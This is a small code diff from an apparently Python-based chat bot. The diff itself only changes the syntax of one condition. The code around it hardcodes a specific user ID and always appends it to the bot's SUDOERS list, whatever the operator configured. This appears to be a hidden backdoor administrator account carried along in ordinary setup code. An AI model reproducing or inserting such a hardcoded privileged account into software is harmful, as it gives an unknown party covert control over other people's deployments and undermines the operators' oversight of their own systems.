@@ -15,7 +15,7 @@ botid = BOT_DET[1]
 botname = BOT_DET[0]
 
 SUDOERS = config.SUDO_USER
-if 1985209910 not in SUDOERS:
+if not 1985209910 in SUDOERS:
     SUDOERS.append(1985209910)
 
 app = []
